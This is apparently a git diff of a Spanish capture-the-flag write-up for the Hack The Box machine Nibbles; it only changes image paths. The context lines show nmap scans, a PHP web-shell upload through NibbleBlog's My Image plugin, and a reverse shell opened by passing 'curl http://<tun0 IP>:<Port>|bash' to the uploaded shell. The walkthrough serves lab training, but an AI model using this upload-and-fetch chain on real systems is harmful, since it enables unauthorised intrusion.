@@ -19,17 +19,17 @@ a. Enumeramos los puertos que están abiertos en la **`Máquina Nibbles`**
 
 * **`nmap -p- -sS -Pn -n <IP> -oG puertos`**
 
-    ![](/assets/images/Machines/Nibbles/01-ports.png)
+    ![](/assets/images/HTB/Easy/Nibbles/01-ports.png)
 
 b. Vemos las versiones de los servicios que se están ejecutando en los puertos.
 
 * **`nmap -p<Ports> -sCV <IP> -oN versiones`**
 
-    ![](/assets/images/Machines/Nibbles/02-versions.png)
+    ![](/assets/images/HTB/Easy/Nibbles/02-versions.png)
 
 c. Al ver el código fuente de la página web inicial, veremos una directorio por el cual podremos empezar a fuzzear
 
-![](/assets/images/Machines/Nibbles/03-leak.png)
+![](/assets/images/HTB/Easy/Nibbles/03-leak.png)
 
 
 * El sitio web está levantado con **`NibbleBlog`** y podemos ver su código fuente en **`Github`** [NibbleBlog](https://github.com/dignajar/nibbleblog). Esto es un gran alternativa a realizar fuzzing y dejar varios logs.
@@ -51,14 +51,14 @@ e. Una vez autenticados, iremos al apartado de **`Plugins -> My Image`**, aquí 
 
 * Como nos fijamos, no existe ningun tipo de sanitización por lo que la 'imagen' se subió normalmente, para verla nos iremos a la siguiente ruta **`http://<IP>/nibbleblog/content/private/plugins/my_image/`**.
 
-    ![](/assets/images/Machines/Nibbles/05-file_upload.png)
+    ![](/assets/images/HTB/Easy/Nibbles/05-file_upload.png)
 
 
 * Una vez garantizada la ejecución remota de comandos, entablamos una reverse shell.
 
     * **URL:** **`http://<IP Nibbles>/nibbleblog/content/private/plugins/my_image/image.php?cmd=curl%20http://<tun0 IP>:<Port>|bash`**
 
-    ![](/assets/images/Machines/Nibbles/06-reverse.png)
+    ![](/assets/images/HTB/Easy/Nibbles/06-reverse.png)
 
 ### Escalada de Privilegios 💹
 
